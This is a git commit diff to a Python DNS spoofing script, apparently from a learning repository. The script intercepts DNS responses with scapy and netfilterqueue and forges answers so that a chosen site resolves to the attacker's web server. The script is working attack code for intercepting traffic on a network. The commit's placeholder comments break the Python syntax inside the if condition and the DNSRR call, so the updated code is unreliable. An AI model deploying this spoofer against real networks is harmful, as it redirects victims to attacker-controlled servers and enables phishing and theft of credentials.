fc67debd19272fc0a85770e7c93a5e850c9883fd
Crake <64699339+crake7@users.noreply.github.com>
2020-11-07 12:30:26 -0500

    Update dns_spoof.py

--- DNS Spoofer/dns_spoof.py
+++ DNS Spoofer/dns_spoof.py
@@ -3,14 +3,13 @@ import netfilterqueue
 import scapy.all as scapy
 
 def process_packet(packet):
-    """This program needs a static website. It also redirects to your file
-    within /var/www/html folders"""
+    """This program needs a static website."""
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname_field = scapy_packet[scapy.DNSQR].qname
-        if "www.stackoverflow.com" in qname_field:
+        if #Input WEBSITE here: "www.stackoverflow.com" in qname_field:
             print("Spoofing target.")
-            answer = scapy.DNSRR(rrname=qname_field, rdata="10.0.2.15")
+            answer = scapy.DNSRR(rrname=qname_field, rdata=#INPUT STATIC IP OF YOUR WEB SERVER HERE: "10.0.2.15")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
